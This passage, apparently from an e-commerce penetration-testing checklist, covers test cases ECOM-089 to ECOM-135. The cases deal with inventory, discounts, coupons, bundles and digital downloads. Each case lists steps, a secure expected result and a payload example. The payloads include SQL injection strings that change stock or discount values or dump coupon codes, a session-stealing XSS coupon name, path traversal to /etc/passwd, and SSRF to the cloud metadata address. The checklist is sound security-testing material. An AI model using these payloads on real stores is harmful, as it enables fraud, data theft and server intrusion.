**Test Steps:** 1. Find inventory query endpoint 2. Inject SQL payload 3. Extract or modify data

**Expected Result:** Inventory queries should be parameterized

**Payload Example:**

```
/inventory?product_id=1'; UPDATE products SET stock=999--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-090 — Hidden Stock Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Query inventory API 2. Find hidden stock locations 3. Access reserved inventory

**Expected Result:** Reserved stock should not be purchasable

**Payload Example:**

```
{"warehouse":"hidden",show_reserved:true}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-091 — Inventory Audit Log Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Modify inventory 2. Attempt to bypass logging 3. Make untraceable changes

**Expected Result:** All changes should be logged

**Payload Example:**

```
Modify via alternative endpoint without logging
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-092 — Mass Assignment on Inventory
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Update inventory 2. Add extra parameters 3. Modify restricted fields

**Expected Result:** Only allowed fields should update

**Payload Example:**

```
{"stock":100,cost_price:0,supplier_id:"attacker"}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ECOM-093 — Warehouse ID Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Select warehouse for inventory 2. Modify warehouse_id 3. Access other warehouse data

**Expected Result:** Warehouse access should be authorized

**Payload Example:**

```
warehouse_id=competitor_warehouse
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-094 — Discount Amount Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Apply discount 2. Intercept request 3. Modify discount percentage 4. Get larger discount

**Expected Result:** Discount should be calculated server-side

**Payload Example:**

```
{"discount_percent":99} instead of 10
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-095 — Price Rule Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Identify price rule conditions 2. Manipulate parameters 3. Apply discount without meeting criteria

**Expected Result:** Rules should be validated server-side

**Payload Example:**

```
Apply member discount without membership
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-096 — Stacking Discounts Exploit
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Apply multiple discounts 2. Stack non-stackable offers 3. Get excessive discount

**Expected Result:** Discount stacking should be controlled

**Payload Example:**

```
Apply coupon + sale + member discount
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-097 — Discount Race Condition
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Apply limited-use discount concurrently 2. Check if multiple uses succeed

**Expected Result:** Discount usage should be atomic

**Payload Example:**

```
Parallel discount application requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-098 — Discount Code SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Enter discount code 2. Inject SQL payload 3. Extract or bypass discount logic

**Expected Result:** Discount codes should be parameterized

**Payload Example:**

```
code='; UPDATE discounts SET percent=100--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-099 — Hidden Discount Discovery
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Enumerate discount endpoints 2. Find hidden discounts 3. Apply expired or internal discounts

**Expected Result:** Hidden discounts should not be accessible

**Payload Example:**

```
/api/discounts/internal_employee_50
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-100 — Price Rule Time Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Identify time-based discount 2. Manipulate client time 3. Apply expired discount

**Expected Result:** Time should be server-validated

**Payload Example:**

```
Modify timestamp or timezone parameters
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-101 — IDOR on Discount Rules
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. View discount rule 2. Modify rule_id 3. Access or modify other rules

**Expected Result:** Discount rules should require admin

**Payload Example:**

```
GET /api/admin/discounts/competitor_rule
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-102 — Negative Discount Application
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Apply negative discount 2. Increase product price 3. Check for credit when returned

**Expected Result:** Discounts should be positive only

**Payload Example:**

```
{"discount":-50} giving 50% surcharge
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-103 — Customer Group Price Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Price Rules / Discounts

**Test Steps:** 1. Identify customer group pricing 2. Modify customer group in request 3. Get wholesale pricing

**Expected Result:** Customer group should be verified server-side

**Payload Example:**

```
customer_group=wholesale or vip_tier=platinum
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-104 — Coupon Code Brute Force
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Identify coupon format 2. Brute force valid codes 3. Use discovered coupons

**Expected Result:** Rate limiting should prevent brute force

**Payload Example:**

```
Iterate through SAVE10|SAVE20|SAVE30...
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / ffuf / Hydra

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ECOM-105 — Coupon Reuse Exploit
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Apply one-time coupon 2. Complete checkout 3. Reuse same coupon

**Expected Result:** One-time coupons should be marked used

**Payload Example:**

```
Apply same single-use coupon twice
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-106 — Coupon Stacking Vulnerability
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Apply first coupon 2. Apply second coupon 3. Stack multiple coupons

**Expected Result:** Only stackable coupons should stack

**Payload Example:**

```
Multiple coupon codes in single order
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-107 — Expired Coupon Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Find expired coupon 2. Manipulate expiry check 3. Apply expired coupon

**Expected Result:** Expiry should be validated server-side

**Payload Example:**

```
Modify expires_at parameter or bypass check
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-108 — Coupon Minimum Order Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Apply coupon with minimum order 2. Remove items after applying 3. Keep discount

**Expected Result:** Minimum should be checked at checkout

**Payload Example:**

```
Apply $100 minimum coupon then remove items
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-109 — Coupon Category Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Apply category-specific coupon 2. Add ineligible items 3. Get discount on all

**Expected Result:** Category restrictions should be enforced

**Payload Example:**

```
Apply electronics coupon to clothing
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-110 — Race Condition on Limited Coupons
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Find coupon with usage limit 2. Apply concurrently from multiple sessions 3. Exceed limit

**Expected Result:** Usage count should be atomic

**Payload Example:**

```
10 parallel coupon applications
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-111 — Coupon SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Enter coupon code 2. Inject SQL payload 3. Extract valid coupons

**Expected Result:** Coupon validation should be parameterized

**Payload Example:**

```
coupon=SAVE10' UNION SELECT code FROM coupons--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-112 — Coupon XSS via Admin Panel
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Create coupon with XSS name 2. View in admin panel 3. Execute XSS

**Expected Result:** Coupon names should be sanitized

**Payload Example:**

```
coupon_name=<script>stealAdminSession()</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-113 — Referral Code Abuse
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Generate referral code 2. Self-refer with new accounts 3. Abuse referral rewards

**Expected Result:** Self-referral should be prevented

**Payload Example:**

```
Create accounts using own referral code
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Multiple Accounts

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-114 — Coupon Generation Prediction
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Generate multiple coupons 2. Analyze code pattern 3. Predict future codes

**Expected Result:** Coupon codes should be random

**Payload Example:**

```
Sequential or pattern-based generation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-115 — Gift Card Balance Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Check gift card balance 2. Intercept and modify 3. Inflate balance

**Expected Result:** Balance should be server-validated

**Payload Example:**

```
Modify balance response before display
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-116 — Coupon Transfer IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Coupon / Promo Codes

**Test Steps:** 1. Transfer coupon to self 2. Modify recipient ID 3. Steal others' coupons

**Expected Result:** Transfers should verify ownership

**Payload Example:**

```
{"coupon_id":"victim_coupon",to_user:"attacker"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-117 — Bundle Price Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Add bundle to cart 2. Intercept request 3. Modify bundle price 4. Get bundle cheaper

**Expected Result:** Bundle price should be server-calculated

**Payload Example:**

```
{"bundle_id":123,price:0.01}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-118 — Bundle Component Swap
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Select bundle 2. Modify included product IDs 3. Get premium items for bundle price

**Expected Result:** Bundle contents should be fixed

**Payload Example:**

```
{"bundle_id":1,items:["premium1",premium2]}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-119 — Individual Pricing on Bundle Items
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Purchase bundle 2. Return individual items 3. Get individual item refunds exceeding bundle price

**Expected Result:** Refund should be proportional to bundle price

**Payload Example:**

```
Return highest value item from bundle
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-120 — Bundle Quantity Exploit
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Add bundle with quantity 2. Modify individual item quantities 3. Get more items

**Expected Result:** Bundle item quantities should be fixed

**Payload Example:**

```
{"bundle_id":1,items:[{"id":1,qty:10}]}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-121 — Hidden Bundle Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Find hidden bundle ID 2. Access via direct URL 3. Purchase unreleased bundle

**Expected Result:** Hidden bundles should not be purchasable

**Payload Example:**

```
/api/bundles/unreleased_bundle_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-122 — Bundle IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. View bundle 2. Modify bundle_id 3. Access restricted bundles

**Expected Result:** Bundle access should be authorized

**Payload Example:**

```
GET /api/bundles/admin_only_bundle
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-123 — Custom Bundle Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Create custom bundle 2. Inject payload in bundle name 3. View bundle

**Expected Result:** Bundle data should be sanitized

**Payload Example:**

```
bundle_name=<script>alert('XSS')</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-124 — Bundle Discount Stacking
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Apply bundle discount 2. Apply additional coupon 3. Get excessive discount

**Expected Result:** Bundle should have discount restrictions

**Payload Example:**

```
Bundle with additional coupon code
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-125 — Dynamic Bundle Race Condition
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bundle Products

**Test Steps:** 1. Create bundle with limited items 2. Concurrent bundle purchases 3. Exceed item stock

**Expected Result:** Bundle creation should check stock atomically

**Payload Example:**

```
Parallel custom bundle creation
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-126 — Download Link Enumeration
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Purchase digital product 2. Get download link 3. Enumerate other download IDs

**Expected Result:** Download links should be unpredictable

**Payload Example:**

```
/downloads/1 through /downloads/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ECOM-127 — Download Without Purchase
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Find download endpoint 2. Access without purchase 3. Download paid content free

**Expected Result:** Downloads should verify purchase

**Payload Example:**

```
GET /downloads/paid_product_file.pdf
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-128 — Download Link Token Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Capture download token 2. Share with others 3. Multiple downloads from one purchase

**Expected Result:** Tokens should be single-use and user-bound

**Payload Example:**

```
Share download_token with another user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-129 — Download Link Expiry Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Get download link 2. Wait for expiry 3. Manipulate expiry parameter

**Expected Result:** Expiry should be server-enforced

**Payload Example:**

```
expires=9999999999 in download URL
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-130 — Path Traversal in Downloads
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Capture download request 2. Inject path traversal 3. Access server files

**Expected Result:** File paths should be validated

**Payload Example:**

```
/download?file=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ECOM-131 — Download IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Download own product 2. Modify product/order ID 3. Download others' purchases

**Expected Result:** Downloads should verify ownership

**Payload Example:**

```
/downloads/order/victim_order_id/product.pdf
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-132 — License Key Prediction
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Purchase product 2. Receive license key 3. Analyze and predict other keys

**Expected Result:** License keys should be random

**Payload Example:**

```
Sequential or pattern-based license keys
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-133 — License Reuse Attack
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Use license key 2. Deactivate device 3. Reuse beyond limit

**Expected Result:** License activations should be tracked

**Payload Example:**

```
Exceed activation limit via race condition
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-134 — Download Count Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Download file 2. Block count request 3. Download unlimited times

**Expected Result:** Count should be enforced server-side

**Payload Example:**

```
Intercept and drop download count increment
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-135 — Digital Content SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Find content URL parameter 2. Inject internal URL 3. Access internal resources

**Expected Result:** URLs should be validated

**Payload Example:**

```
content_url=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ECOM-136 — Signed URL Manipulation
